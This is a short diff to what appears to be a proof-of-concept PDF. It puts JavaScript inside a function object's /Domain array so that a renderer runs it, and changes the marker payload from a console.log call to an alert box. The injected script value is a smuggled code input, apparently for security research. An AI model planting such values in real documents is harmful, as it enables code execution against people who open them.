@@ -3,7 +3,7 @@
 <<
   /FunctionType 4
   /Domain [(console.log("Starting"),
-console.log("PoC")
+alert("Proof Of Concept")
 ) 0]
   /Range [0 0]
   /Length 12
